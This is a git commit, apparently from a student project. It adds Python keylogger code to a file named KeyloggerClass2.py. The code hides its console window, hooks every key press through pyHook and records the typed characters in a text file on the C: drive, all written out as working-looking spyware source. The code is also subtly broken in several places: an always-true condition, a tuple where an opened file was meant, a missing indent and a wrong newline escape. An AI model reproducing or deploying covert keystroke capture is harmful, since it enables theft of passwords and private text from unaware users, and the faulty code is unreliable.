341cc6e8e18812d23ba7d9a310b9c22041fe4bbf
Monte Knowles <Monte.Faison@seattlecolleges.edu>
2020-06-05 11:16:57 -0700

    Resave Commit for the Keylogger

--- KeyloggerClass2.py
+++ KeyloggerClass2.py
@@ -12,3 +12,48 @@ win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
 
+def OnKeyboardEvent(event): 
+
+
+	if event.Ascii==5:
+		_exit(1)
+
+
+	if event.Ascii !=0 or 8:
+
+		f = open('c:\output.txt', 'r+') #<--Open the path file as a text file and input the keyboard text. 
+
+
+		buffer = f.read()
+
+		f.close() #<--Close the file on the operating system when the user stops typing
+
+	#Reopen the text file when the user starts typing again on the keyboard.
+		f = ('c:\output.txt', 'w')
+
+		keylogs = chr(event.Ascii)
+
+		if event.Ascii == 13:
+
+		keylogs = '/n' #<----Start a new line in the text file. 
+
+		buffer += keylogs
+
+		f.write(buffer)
+		f.close() 
+
+#Create a hook for the manager object
+
+hm = pyHook.HookManager() #<---Referencing the class library that was implementedn 
+hm.KeyDown = OnKeyboardEvent #<---Everytime you press on the keyboard, run the function of logging the events in a text file.
+
+#Set the hook 
+hm.HookKeyboard()
+
+#Wait forever
+pythoncom.PumpMessages()
+
+
+
+
+
